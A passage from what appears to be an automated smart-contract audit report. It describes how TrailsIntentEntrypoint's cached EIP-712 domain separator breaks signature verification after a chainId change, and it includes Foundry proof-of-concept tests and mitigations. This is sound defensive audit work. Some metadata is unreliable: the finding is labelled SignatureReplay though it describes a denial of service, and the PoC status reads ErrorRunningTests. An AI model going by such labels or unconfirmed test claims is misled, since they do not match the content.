1) Deploy TrailsIntentEntrypoint on chainId X. 2) User signs a valid intent and depositToIntent succeeds. 3) ChainId changes to Y (fork/migration). 4) User signs a new intent over the new domain (chainId Y). 5) Contract still verifies against cached domain (X) while struct encodes Y, causing ECDSA.recover to fail and depositToIntent to revert with InvalidIntentSignature.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {TrailsIntentEntrypoint} from "src/TrailsIntentEntrypoint.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor() ERC20("Mock", "MOCK") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract ChainIdDriftTest is Test {
    TrailsIntentEntrypoint entrypoint;
    MockERC20 token;
    uint256 userPk;
    address user;

    function setUp() public {
        entrypoint = new TrailsIntentEntrypoint();
        token = new MockERC20();
        userPk = 0xA11CE;
        user = vm.addr(userPk);
        token.mint(user, 1e24);
        vm.prank(user);
        token.approve(address(entrypoint), type(uint256).max);
    }

    function test_ChainIdDrift_BricksDeposits() public {
        uint256 amount = 1e18;
        address intent = address(0xBEEF);
        uint256 feeAmount = 0;
        address feeCollector = address(0);
        uint256 deadline = block.timestamp + 1 days;

        // Baseline on current chainId
        uint256 nonce0 = entrypoint.nonces(user);
        bytes32 typehash = entrypoint.TRAILS_INTENT_TYPEHASH();
        uint256 ch0 = block.chainid;
        bytes32 msgHash0 = keccak256(abi.encode(
            typehash,
            user,
            address(token),
            amount,
            intent,
            deadline,
            ch0,
            nonce0,
            feeAmount,
            feeCollector
        ));
        bytes32 digest0 = keccak256(abi.encodePacked("\x19\x01", entrypoint.DOMAIN_SEPARATOR(), msgHash0));
        (uint8 v0, bytes32 r0, bytes32 s0) = vm.sign(userPk, digest0);

        entrypoint.depositToIntent(
            user,
            address(token),
            amount,
            intent,
            deadline,
            nonce0,
            feeAmount,
            feeCollector,
            v0,
            r0,
            s0
        );
        assertEq(token.balanceOf(intent), amount, "baseline deposit should succeed");

        // Simulate chainId change
        vm.chainId(ch0 + 1);
        uint256 nonce1 = entrypoint.nonces(user); // should be 1 now

        // Wallet signs over NEW domain (new chainId) and struct chainId
        bytes32 DOMAIN_TYPEHASH = keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)");
        bytes32 nameHash = keccak256(bytes("TrailsIntentEntrypoint"));
        bytes32 versionHash = keccak256(bytes(entrypoint.VERSION()));
        bytes32 newDomain = keccak256(abi.encode(
            DOMAIN_TYPEHASH,
            nameHash,
            versionHash,
            block.chainid,
            address(entrypoint)
        ));
        bytes32 msgHash1 = keccak256(abi.encode(
            typehash,
            user,
            address(token),
            amount,
            intent,
            deadline,
            block.chainid,
            nonce1,
            feeAmount,
            feeCollector
        ));
        bytes32 digest1 = keccak256(abi.encodePacked("\x19\x01", newDomain, msgHash1));
        (uint8 v1, bytes32 r1, bytes32 s1) = vm.sign(userPk, digest1);

        vm.expectRevert(TrailsIntentEntrypoint.InvalidIntentSignature.selector);
        entrypoint.depositToIntent(
            user,
            address(token),
            amount,
            intent,
            deadline,
            nonce1,
            feeAmount,
            feeCollector,
            v1,
            r1,
            s1
        );
    }
}


## Suggested Mitigation
Do not cache DOMAIN_SEPARATOR immutably across potential chainId changes. Use OpenZeppelin EIP712 (which recomputes if chainId changes), or compute the domain separator on-the-fly using block.chainid. Alternatively, remove the chainId field from the typed struct (domain already binds chainId) to avoid double-binding, and ensure verification always uses a domain that reflects the current chainId.





 **Derived From** : Cached EIP‑712 DOMAIN_SEPARATOR can break on chainId changes (domain drift)

## [M-7]. ChainId drift DoS: cached DOMAIN_SEPARATOR + dynamic chainid() in TrailsIntentEntrypoint invalidates all signed intents after L2 chainId update

### Finding Severity Justification: A chainId change causes a persistent functional DoS of the core entrypoint: all existing and future signatures fail verification because the contract caches the DOMAIN_SEPARATOR with the old chainId while the message struct uses the current chainid() at verification time. This breaks deposit/fee flows until a redeploy or contract address update. No direct asset loss occurs, so impact is availability/operability rather than fund theft.
## Derived From Pattern/Invariant
Cached EIP‑712 DOMAIN_SEPARATOR can break on chainId changes (domain drift)

## Exploit Type
SignatureReplay

## Location
TrailsIntentEntrypoint.constructor

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
TrailsIntentEntrypoint caches the EIP‑712 DOMAIN_SEPARATOR at deployment with block.chainid and address(this), but later computes the typed struct with the current chainid(). If the network’s chainId changes (known to happen on some L2s), previously signed intents become unverifiable because the signature domain (old chainId) no longer matches the struct (new chainId). This bricks execution of all outstanding signatures, causing a liveness DoS. Vulnerable lines: constructor() { DOMAIN_SEPARATOR = keccak256(abi.encode(..., block.chainid, address(this))); } and in _verifyAndMarkIntent (assembly): mstore(add(ptr, 0xc0), chainid()).

## Impact
A chainId change permanently bricks this entrypoint instance. All pre-change signatures fail because the struct is recomputed with the new chainId while the cached DOMAIN_SEPARATOR still uses the old one. All post-change signatures also fail because off-chain libraries will compute the EIP-712 domain with the new chainId, whereas the contract verifies against the old cached separator. Result: both deposit paths are unusable until a redeploy or a domain-separator implementation that adapts to chainId changes. No direct fund loss, but complete liveness/operability DoS.

## Command to Run Test


## Proof of Concept
1) Deploy TrailsIntentEntrypoint while chainId = 100, so DOMAIN_SEPARATOR is bound to chainId 100. 2) User signs a valid EIP-712 intent using chainId=100 in both the domain and struct. 3) The L2 updates chainId to 101. 4) Call depositToIntent with the old signature: _verifyAndMarkIntent hashes the struct with chainid()=101 while DOMAIN_SEPARATOR remains on 100, causing InvalidIntentSignature. 5) User now re-signs a fresh intent with chainId=101 (as all EIP-712 libs will): verification still fails because the contract’s DOMAIN_SEPARATOR is still bound to chainId=100, while the off-chain domain used 101. Conclusion: both old and new signatures fail after a chainId change.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {TrailsIntentEntrypoint} from "src/TrailsIntentEntrypoint.sol";

contract ChainIdDriftDosTest is Test {
    function _signIntent(
        uint256 pk,
        TrailsIntentEntrypoint entry,
        address user,
        address token,
        uint256 amount,
        address intentAddress,
        uint256 deadline,
        uint256 chainId_,
        uint256 nonce,
        uint256 feeAmount,
        address feeCollector
    ) internal view returns (uint8 v, bytes32 r, bytes32 s) {
        bytes32 typehash = entry.TRAILS_INTENT_TYPEHASH();
        bytes32 intentHash = keccak256(
            abi.encode(
                typehash,
                user,
                token,
                amount,
                intentAddress,
                deadline,
                chainId_,
                nonce,
                feeAmount,
                feeCollector
            )
        );

        // Build EIP-712 domain for the given chainId_
        bytes32 domainTypehash = keccak256(
            "EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"
        );
        bytes32 nameHash = keccak256(bytes("TrailsIntentEntrypoint"));
        bytes32 versionHash = keccak256(bytes(entry.VERSION()));
        bytes32 domainSeparator = keccak256(
            abi.encode(
                domainTypehash,
                nameHash,
                versionHash,
                chainId_,
                address(entry)
            )
        );

        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", domainSeparator, intentHash));
        return vm.sign(pk, digest);
    }

    function test_ChainIdDrift_PreviousAndFutureIntentsFail() public {
        // Deploy on chainId = 100
        vm.chainId(100);
        TrailsIntentEntrypoint entry = new TrailsIntentEntrypoint();

        uint256 userPk = 0xA11CE;
        address user = vm.addr(userPk);
        address token = address(0x1);
        address intentAddress = address(0xBEEF);
        uint256 amount = 1e18;
        uint256 feeAmount = 0;
        address feeCollector = address(0);
        uint256 nonce = 0;
        uint256 deadline = block.timestamp + 1 days;

        // Old signature (pre-change, chainId = 100)
        (uint8 v1, bytes32 r1, bytes32 s1) = _signIntent(
            userPk, entry, user, token, amount, intentAddress, deadline, 100, nonce, feeAmount, feeCollector
        );

        // Simulate L2 chainId update to 101
        vm.chainId(101);

        // Pre-change signature now fails (struct uses 101, domain cached at 100)
        vm.expectRevert(TrailsIntentEntrypoint.InvalidIntentSignature.selector);
        entry.depositToIntent(
            user,
            token,
            amount,
            intentAddress,
            deadline,
            nonce,
            feeAmount,
            feeCollector,
            v1,
            r1,
            s1
        );

        // New signature (post-change, chainId = 101) also fails because contract uses cached DOMAIN_SEPARATOR (100)
        (uint8 v2, bytes32 r2, bytes32 s2) = _signIntent(
            userPk, entry, user, token, amount, intentAddress, deadline, 101, nonce, feeAmount, feeCollector
        );

        vm.expectRevert(TrailsIntentEntrypoint.InvalidIntentSignature.selector);
        entry.depositToIntent(
            user,
            token,
            amount,
            intentAddress,
            deadline,
            nonce,
            feeAmount,
            feeCollector,
            v2,
            r2,
            s2
        );
    }
}


## Suggested Mitigation
Ensure the same chainId is used in both the EIP-712 domain and the message struct at verification time. Recommended fix: adopt OpenZeppelin’s EIP712 pattern for DOMAIN_SEPARATOR (cache and recompute if block.chainid changes), and remove chainId from the TrailsIntent struct so the chain binding comes solely from the domain. If retaining chainId in the struct is desired, add it as an explicit function parameter and use that value in the struct hash while either (a) requiring it equals block.chainid, or (b) using OZ’s dynamic domain so new signatures work after a chainId change. Any solution must avoid mixing a cached domain (old chainId) with a struct that uses the current chainid().



